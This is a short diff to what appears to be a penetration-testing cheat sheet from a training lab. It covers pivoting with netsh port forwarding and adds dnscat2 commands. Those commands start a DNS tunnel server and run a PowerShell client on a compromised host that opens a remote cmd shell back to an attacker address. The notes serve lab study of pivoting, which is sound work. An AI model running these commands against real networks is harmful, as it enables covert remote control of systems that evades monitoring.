@@ -73,3 +73,18 @@ Netsh:
   netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
     netsh.exe interface portproxy show v4tov4
     https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh
+
+Dnscat2:
+  ATC host:
+  sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+    https://github.com/iagox86/dnscat2
+
+  PWN host:
+  PS C:\htb> Import-Module .\dnscat2.ps1
+  PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
+    https://github.com/lukebaggett/dnscat2-powershell
+
+
+Chisel:
+  
+    https://github.com/jpillora/chisel
